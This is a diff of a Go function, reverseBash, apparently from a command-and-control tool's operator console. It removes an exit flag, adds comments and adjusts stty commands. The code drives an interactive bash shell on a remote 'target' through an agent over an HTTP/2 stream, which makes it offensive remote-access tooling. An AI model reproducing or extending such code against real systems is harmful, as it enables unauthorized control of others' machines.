@@ -22,9 +22,6 @@ func reverseBash() {
 		return
 	}
 
-	// indicates when to exit
-	isExit := false
-
 	// activate reverse shell in agent
 	err := SendCmd("bash", CurrentTarget)
 	if err != nil {
@@ -45,6 +42,7 @@ func reverseBash() {
 	}
 	oldTerm := strings.TrimSpace(string(out))
 
+	// clean up connection and TTY file
 	cleanup := func() {
 		out, err := exec.Command("stty", "-F", "/dev/tty", oldTerm).CombinedOutput()
 		if err != nil {
@@ -66,10 +64,6 @@ func reverseBash() {
 	// receive and display bash's output
 	go func() {
 		for incoming := range RecvAgent {
-			if isExit {
-				return
-			}
-
 			os.Stdout.Write(incoming)
 		}
 	}()
@@ -77,17 +71,14 @@ func reverseBash() {
 	// send whatever input to target's bash
 	go func() {
 		for outgoing := range SendAgent {
-			if isExit {
-				return
-			}
 
+			// if connection does not exist yet
 			if agent.H2Stream == nil {
 				continue
 			}
 			_, err = agent.H2Stream.Write(outgoing)
 			if err != nil {
 				log.Print("Send to remote: ", err)
-				isExit = true
 				return
 			}
 		}
@@ -101,22 +92,17 @@ func reverseBash() {
 	signal.Notify(ch, syscall.SIGWINCH)
 	go func() {
 		for range ch {
-			if isExit {
-				return
-			}
-
+			// resize local terminal
 			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
 				log.Printf("error resizing pty: %s", err)
 			}
-
-			// set remote stty
+			// sync remote terminal with stty
 			winSize, err := pty.GetsizeFull(os.Stdin)
 			if err != nil {
 				CliPrintWarning("Cannot get terminal size: %v", err)
-				isExit = true
 				return
 			}
-			setupTermCmd := fmt.Sprintf("stty rows %d columns %d\n",
+			setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
 				winSize.Rows, winSize.Cols)
 			SendAgent <- []byte(setupTermCmd)
 		}
@@ -128,7 +114,7 @@ func reverseBash() {
 	if err != nil {
 		CliPrintWarning("Cannot get terminal size: %v", err)
 	}
-	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
+	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
 		currentWinSize.Rows, currentWinSize.Cols)
 	SendAgent <- []byte(setupTermCmd)
 
@@ -140,18 +126,16 @@ func reverseBash() {
 	}
 
 	for {
-		// read stdin
+		// read user input from /dev/tty
 		buf := make([]byte, agent.BufSize)
 		consoleReader := bufio.NewReader(ttyf)
 		_, err := consoleReader.Read(buf)
 		if err != nil {
 			CliPrintWarning("Bash read input: %v", err)
-			isExit = true
 			break
 		}
 		if buf[0] == 4 { // Ctrl-D is 4
 			color.Red("EOF")
-			isExit = true
 			break
 		}
 
